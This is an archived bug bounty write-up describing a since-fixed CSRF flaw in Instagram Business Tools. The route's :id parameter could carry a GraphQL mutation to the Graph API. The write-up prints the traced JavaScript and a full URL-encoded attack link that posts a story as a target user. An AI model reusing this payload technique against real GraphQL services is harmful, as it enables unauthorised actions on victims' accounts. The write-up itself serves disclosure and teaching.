---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-10-08_facebook-graphql-csrf.md
original_filename: 2017-10-08_facebook-graphql-csrf.md
title: Facebook GraphQL CSRF
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
- csrf
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
- csrf
language: en
raw_sha256: 22868a4a5f9ea3fae42423b7ab3d76e727104f60d37c181afa881a8feb243a36
text_sha256: c7c9fac0ee3d8847953f95389a3e4b683c328f3246b2df8325201cce71bdfc3b
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Facebook GraphQL CSRF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-10-08_facebook-graphql-csrf.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql, csrf
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `22868a4a5f9ea3fae42423b7ab3d76e727104f60d37c181afa881a8feb243a36`
- Text SHA256: `c7c9fac0ee3d8847953f95389a3e4b683c328f3246b2df8325201cce71bdfc3b`


## Content

---
title: "Facebook GraphQL CSRF"
page_title: "Facebook GraphQL CSRF - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/facebook-graphql-csrf/"
final_url: "https://philippeharewood.com/facebook-graphql-csrf/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["CSRF"]
bounty: "7,500"
publication_date: "2017-10-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6085
---

Posted on [October 8, 2017](https://philippeharewood.com/facebook-graphql-csrf/)

# Facebook GraphQL CSRF

There was a “CSRF” styled query in business.instagram.com that can allow GraphQL calls to be made.  
The discovery of the bug in [View the Assigned Roles and Emails of an Instagram Account](http://philippeharewood.com/view-the-assigned-roles-and-emails-of-an-instagram-account/) started at business.instagram.com/login with an authorization screen. If a user did not have an Instagram Business account an error page was shown.  
![](http://philippeharewood.com/wp-content/uploads/2017/10/Insta.png)  
The last screen sent the user to https://business.instagram.com/select. Searching for the string `/select` in Chrome Developer Tools points to the `BusinessToolsEntrypoint.instagram` module. In there has a function which shows the flow
  
  
  c("Router.instagram").get("/login", function(l, m, n) {
  c("auth.instagram").ensure(function() {
  m.redirect("/select")
  }, function() {
  c("Bootloader").loadModules(["BusinessLogin.instagram"], function(o) {
  m.send({
  component: o
  })
  }, "BusinessToolsEntrypoint.instagram")
  })
  });
  
  

One function lower shows what happens for the business `/select` screen,
  
  
  c("Router.instagram").get("/select", i(function(l, m, n) {
  c("Bootloader").loadModules(["BusinessSelect.instagram"], function(o) {
  m.send({
  component: o
  })
  }, "BusinessToolsEntrypoint.instagram")
  }));
  
  

And in the `BusinessSelect.instagram` module,
  
  
  
  function k() {
  var l, m;
  "use strict";
  for (var n = arguments.length, o = Array(n), p = 0; p < n; p++) o[p] = arguments[p];
  return m = (l = j.constructor).call.apply(l, [this].concat(o)), this.state = {
  businesses: null
  }, this.dataChangeHandler = function() {
  var q = c("FBViewerStore.instagram").getAllBusinesses(),
  r = c("FBViewerStore.instagram").getViewerBusiness();
  if (q && q.length === 1 && !r) {
  var s = q[0],
  t = c("Router.instagram").getQueryParams();
  c("Router.instagram").navigate("/business/" + s.id, t)
  } else this.setState({
  businesses: q
  })
  }.bind(this), this.renderError = function() {
  return c("React").createElement(c("BusinessMessage.instagram"), {
  heading: h._("You do not have permission to access Business Tools."),
  subHeading: h._("Contact your work admin if you think this is a mistake."),
  withBox: true
  })
  
  

Since I don't have any Instagram businesses, I don't have permission to the tools. Returning to the `BusinessToolsEntrypoint.instagram` module, there are a few routes that can happen in the tool.

  * `/login`
  * `/business/:id`
  * `/business/:id/manage/people`
  * `/business/:id/manage/accounts`
  * `/business/:id/manage/adaccounts/`
  * `/business/:id/insights/:username/:tab?`
  * `/business/:id/insights/:username/:tab?/p/:shortcode`

Following the flow for `/business/:id`,

  1. `BusinessToolsEntrypoint.instagram`
  * Route the slug "/business/:id"
  * `c("Router.instagram").get("/business/:id"...`
  * `c("Bootloader").loadModules(["BusinessHome.instagram"]...`
  * `m.send({ component: o, props: l.params })...`
  2. `BusinessHome.instagram`
  * Handle data changes for the component and load the business data
  * `m.prototype.componentDidMount`
  * `c("BusinessStore.instagram").addListener(c("BusinessStore.instagram").CHANGE_EVENT`
  * `this.dataChangeHandler()`
  * `this.dataChangeHandler = function()`
  * `c("BusinessStore.instagram").getBusiness(this.props.id)`
  3. `BusinessStore.instagram`
  * Request the business data from Facebook Graph API
  * `this._fetchBusiness(x)`
  * `u(t(x), "get").then(function(A)`
  * `s = "?fields=" + ["id", "name", r].join()`
  * `function t(w) { return w + s }`
  * `function u(w, x, y)`
  * `c("graph.instagram")(w, x, y, function(B, C)`

If a user went to `https://business.instagram.com/business/113702895386410`, the `:id` portion would be sent to the component from `BusinessHome.instagram`. There is a data change listener that would handle a data load request for the ID `113702895386410` and call the GraphAPI.  
`https://graph.facebook.com/v2.4/113702895386410?access_token=IG_TOKEN&callback=FB.__globalCallbacks.f1a20b453d927fc&fields=id%2Cname%2Cinstagram_users.limit(1000).filtering(%5B%7Bfield%3A%22role%22%2Coperator%3A%22IN%22%2Cvalue%3A%5B%22manager%22%2C%22analyst%22%5D%7D%5D).fields(id%2Cusername%2Clogging_start_date%2Crole%2Cprofile_pic%2Cmedia_count%2Cfollow_count%2Cfollowed_by_count%2Cinsights.metric(page_impressions%2Cpage_impressions_unique).since(1506126329).until(1509323129)%2Cinstagram_media.limit(8).fields(id%2Ccontent_type%2Cdisplay_url%2Cvideo_url))&method=get&pretty=0&sdk=joey`  
However `113702895386410` isn't an Instagram business account. So it seems the `:id` parameter has some flexibility with using the Graph API. Since the access_token used in Instagram Tools has access to GraphQL there should be a way to perform calls.  
`graphql?q=Mutation SyncAddMutations : SyncAddMutationsResponse {story_create(<input>){client_mutation_id}}&query_params={'input':'{\'actor_id\':\'TARGET_ID\',\'client_mutation_id\':\'1\',\'audience\':{\'privacy\':{\'@_@\':\'@_@\',\'@_@\':\'@_@\'}},\'@_@\':\'@_@\',\'message\':{\'text\':\'MaliciousMessage\'}}'}`  
The above query does not need to be sent via HTTP POST. So the final query to send to the victim  
`https://business.instagram.com/business/graphql%3Fq%3DMutation%20SyncAddMutations%20%3A%20SyncAddMutationsResponse%20%7Bstory_create%28%3Cinput%3E%29%7Bclient_mutation_id%7D%7D%26query_params%3D%7B%27input%27%3A%27%7B%5C%27actor_id%5C%27%3A%5C%27TARGET_ID%5C%27%2C%5C%27client_mutation_id%5C%27%3A%5C%271%5C%27%2C%5C%27audience%5C%27%3A%7B%5C%27privacy%5C%27%3A%7B%5C%27@_@%5C%27%3A%5C%27@_@%5C%27%2C%5C%27@_@%5C%27%3A%5C%27@_@%5C%27%7D%7D%2C%5C%27@_@%5C%27%3A%5C%27@_@%5C%27%2C%5C%27message%5C%27%3A%7B%5C%27text%5C%27%3A%5C%27MaliciousMessage%5C%27%7D%7D%27%7D%26fixend`  
(@_@ - other fields dropped for brevity)  
The `fixend` is appended to handle the original query formed in `BusinessStore.instagram`  
`s = "?fields=" + ["id", "name", r].join()`  
`function t(w) { return w + s }`  
**Impact**  
This issue allowed an attacker to carry out arbitrary mutations (CSRF) as the victim. The link provided by the attacker is specific to a victim (`actor_id`) and the victim should authenticate the Instagram business app.  
**Timeline**

  * Oct 8, 2017 – Report Sent
  * Oct 9, 2017 – Further investigation by Facebook
  * Oct 10, 2017 – Fixed by Facebook
  * Oct 19, 2017 – $7500 bounty Awarded by Facebook
